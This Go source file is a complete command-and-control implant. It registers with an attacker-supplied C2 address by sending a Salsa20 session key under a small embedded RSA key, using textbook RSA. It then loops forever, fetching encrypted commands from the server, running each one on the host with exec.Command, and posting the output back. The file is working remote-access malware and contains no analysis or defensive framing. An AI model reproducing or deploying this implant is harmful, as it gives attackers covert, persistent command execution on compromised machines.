package main

import (
	"bytes"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	b64 "encoding/base64"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"log"
	"math/big"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"

	"golang.org/x/crypto/salsa20"
)

var ClientId string
var salsa_key [32]byte
var c2_address string

type RegistrationResponse struct {
	ClientId string
}

type C2Request struct {
	ClientId string
	Nonce    string
	Msg      string
}

type C2Response struct {
	Nonce string
	Msg   string
}

type C2Get struct {
	MsgType string
}

type C2Command struct {
	MsgType string
	Command string
}

type C2Output struct {
	MsgType string
	Output  string
}

func main() {

	c2_address = os.Args[1]

	var pubkey []byte
	var registration RegistrationResponse

	client := http.Client{
		Timeout: 30 * time.Second,
	}

	//Load public key
	pubkey = []byte("-----BEGIN RSA PUBLIC KEY-----\nMCgCIQDEuw+3djCqXRGCIvK2349FZHgl+kz40rlHhRSL94dSfQIDAQAB\n-----END RSA PUBLIC KEY-----\n")
	pubPem, _ := pem.Decode(pubkey)
	key, _ := x509.ParsePKCS1PublicKey(pubPem.Bytes)

	//Create new Salsa20 key'
	temp_key := make([]byte, 32)
	_, err := rand.Read(temp_key)
	if err != nil {
		log.Fatalf("Error while generating random key: %s", err)
	}

	salsa_key = [32]byte(temp_key)

	//Register with C2 and send key with RSA
	salsaRequest := EncryptWithPublicKey(salsa_key[:], key)
	enc := b64.StdEncoding.EncodeToString(salsaRequest)
	bodyReader := bytes.NewReader([]byte(enc))
	req, err := http.NewRequest(http.MethodPost, fmt.Sprintf("http://%s/register", c2_address), bodyReader)

	if err != nil {
		log.Fatalf("Error while connecting to C2 server: %s", err)
	}

	res, err := client.Do(req)

	if err != nil {
		log.Fatalf("Error while connecting to C2 server: %s", err)
	}

	defer res.Body.Close()

	resBody, err := io.ReadAll(res.Body)
	json.Unmarshal(resBody, &registration)

	// Set client ID
	ClientId = registration.ClientId

	// Loop forever
	for {

		// Get command
		command := GetC2Command()

		if command.MsgType == "exit" {
			os.Exit(0)
		}

		cmdparts := strings.Split(command.Command, " ")

		out, err := exec.Command(cmdparts[0], cmdparts[1:]...).Output()
		if err != nil {
			out = []byte(err.Error())
		}

		SendC2Output(out)

		time.Sleep(2 * time.Second)
	}
}

func EncryptWithPublicKey(msg []byte, pub *rsa.PublicKey) []byte {
	e := big.NewInt(65537)
	x := big.NewInt(0)
	x.SetBytes(msg)
	enc := x.Exp(x, e, pub.N)
	return enc.Bytes()
}

func GetC2Command() C2Command {

	var c2_response C2Response
	var c2_command C2Command

	init_c2 := C2Get{"getcmd"}

	client := http.Client{
		Timeout: 30 * time.Second,
	}

	// Marshal to JSON
	in, err := json.Marshal(init_c2)
	out := make([]byte, len(in))
	nonce := make([]byte, 8)

	_, err = rand.Read(nonce)
	if err != nil {
		log.Fatalf("Error while generating random nonce: %s", err)
	}

	// Encrypt message
	salsa20.XORKeyStream(out, in, nonce[:], &salsa_key)

	// Encode to base64
	enc := b64.StdEncoding.EncodeToString(out)
	enc_nonce := b64.StdEncoding.EncodeToString(nonce)

	// Create request message
	c2_request := C2Request{ClientId, enc_nonce, enc}
	c2_request_json, err := json.Marshal(c2_request)
	bodyReader := bytes.NewReader(c2_request_json)

	// Send request
	req, err := http.NewRequest(http.MethodPost, fmt.Sprintf("http://%s/cmd", c2_address), bodyReader)
	req.Header.Set("Content-Type", "application/json")

	if err != nil {
		log.Fatalf("Error while preparing C2 request: %s", err)
	}

	res, err := client.Do(req)

	if err != nil {
		log.Fatalf("Error while connecting to C2 server: %s", err)
	}

	defer res.Body.Close()

	// Load response
	resBody, err := io.ReadAll(res.Body)
	if err != nil {
		log.Fatalln(err)
	}
	err = json.Unmarshal(resBody, &c2_response)

	nonce, err = b64.StdEncoding.DecodeString(c2_response.Nonce)
	msg_enc, err := b64.StdEncoding.DecodeString(c2_response.Msg)

	out = make([]byte, len(msg_enc))

	salsa20.XORKeyStream(out, msg_enc, nonce[:], &salsa_key)

	err = json.Unmarshal(out, &c2_command)

	return c2_command
}

func SendC2Output(output []byte) error {

	c2_output := C2Output{"output", string(output)}

	client := http.Client{
		Timeout: 30 * time.Second,
	}

	// Marshal to JSON
	in, err := json.Marshal(c2_output)
	out := make([]byte, len(in))
	nonce := make([]byte, 8)

	_, err = rand.Read(nonce)
	if err != nil {
		return err
	}

	// Encrypt message
	salsa20.XORKeyStream(out, in, nonce[:], &salsa_key)

	// Encode to base64
	enc := b64.StdEncoding.EncodeToString(out)
	enc_nonce := b64.StdEncoding.EncodeToString(nonce)

	// Create request message
	c2_request := C2Request{ClientId, enc_nonce, enc}
	c2_request_json, err := json.Marshal(c2_request)
	bodyReader := bytes.NewReader(c2_request_json)

	// Send request
	req, err := http.NewRequest(http.MethodPost, fmt.Sprintf("http://%s/output", c2_address), bodyReader)
	req.Header.Set("Content-Type", "application/json")

	if err != nil {
		return err
	}

	_, err = client.Do(req)

	if err != nil {
		return err
	}

	return nil
}
